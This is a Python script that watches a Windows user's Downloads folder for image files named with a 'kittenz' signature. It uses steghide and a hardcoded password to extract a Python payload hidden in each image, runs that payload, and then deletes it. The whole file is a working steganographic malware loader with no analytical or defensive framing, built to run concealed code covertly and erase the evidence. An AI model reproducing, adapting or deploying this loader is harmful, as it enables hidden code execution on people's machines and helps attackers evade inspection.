import os
import time
import subprocess
from pathlib import Path

DOWNLOADS_FOLDER = Path.home() / "Downloads"
SIGNATURE = "kittenz"  # Signature to look for
STEGO_PASSWORD = "secret123"  # Steghide password
CHECK_INTERVAL = 5  # seconds

python_path = r"C:\Python312\python.exe"
steghide_path = r"E:\steghide\steghide.exe"

def extract_payload(image_path):
    # print("This line is executing")
    extracted_file = DOWNLOADS_FOLDER / "extracted_payload.py"
    cmd = [
        steghide_path, "extract",
        "-sf", str(image_path),
        "-p", STEGO_PASSWORD,
        "-xf", str(extracted_file)
    ]

    result = subprocess.run(cmd, capture_output=True, text=True)

    # Combine stdout and stderr for checking message
    combined_output = result.stdout.lower() + result.stderr.lower()

    if result.returncode == 0:
        print(f"[+] Payload extracted from {image_path}")
        return extracted_file
    else:
        print(f"[-] Extraction failed: {result.stderr.strip() or result.stdout.strip()}")
        return None


def execute_payload(script_path):
    try:
        print(f"[+] Executing payload: {script_path}")
        subprocess.run([python_path, str(script_path)])
    except Exception as e:
        print(f"[!] Execution failed: {e}")
    finally:
        os.remove(script_path)

def monitor_downloads():
    print(f"[*] Monitoring {DOWNLOADS_FOLDER} for stego images...")
    seen_files = set(f.name for f in DOWNLOADS_FOLDER.iterdir())

    while True:
        time.sleep(CHECK_INTERVAL)
        current_files = set(f.name for f in DOWNLOADS_FOLDER.iterdir())
        new_files = current_files - seen_files

        for filename in new_files:
            if filename.lower().endswith(('.jpg', '.jpeg', '.png')) and SIGNATURE in filename.lower():
                image_path = DOWNLOADS_FOLDER / filename
                print(f"[+] Suspicious image detected: {filename}")

                # Ensure file is fully downloaded
                time.sleep(5)

                payload = extract_payload(image_path)
                if payload:
                    execute_payload(payload)

        seen_files = current_files

if __name__ == "__main__":
    monitor_downloads()